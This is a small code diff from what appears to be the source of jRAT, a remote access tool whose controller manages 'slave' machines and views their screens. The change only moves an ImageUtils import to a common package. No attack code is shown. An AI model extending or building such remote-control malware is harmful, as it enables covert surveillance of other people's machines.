@@ -6,7 +6,7 @@ import java.io.DataInputStream;
 
 import se.jrat.client.Slave;
 import se.jrat.client.ui.frames.FrameRemoteScreen;
-import se.jrat.client.utils.ImageUtils;
+import se.jrat.common.utils.ImageUtils;
 
 public class Packet17RemoteScreen extends AbstractIncomingPacket {
 
